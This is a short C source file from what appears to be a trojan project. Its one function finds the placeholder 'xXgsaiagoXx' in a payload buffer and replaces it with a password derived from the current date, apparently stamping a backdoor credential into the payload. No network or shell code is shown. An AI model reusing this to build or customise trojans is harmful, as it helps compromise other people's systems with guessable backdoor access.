#include "trojan.h"

int patch_payload(unsigned char *payload, unsigned int payload_len) {
	const char password_base[] = "xXgsaiagoXx";
	const int last_valid_compare_position = payload_len - sizeof(password_base);
	char	  password[sizeof(password_base)] = {0};
	time_t	  raw_time;
	struct tm *local_time;

	raw_time = time(NULL);
	local_time = localtime(&raw_time);
	strftime(password, sizeof(password), "gsaiago%y%d", local_time);

	if (last_valid_compare_position < 0) {
		return (-1);
	}
	for (int i = 0; i <= last_valid_compare_position; i++) {
		if (memcmp(&payload[i], password_base, sizeof(password_base)) == 0) {
			memmove(&payload[i], password, sizeof(password));
			return (0);
		}
	}
	return (-1);
}
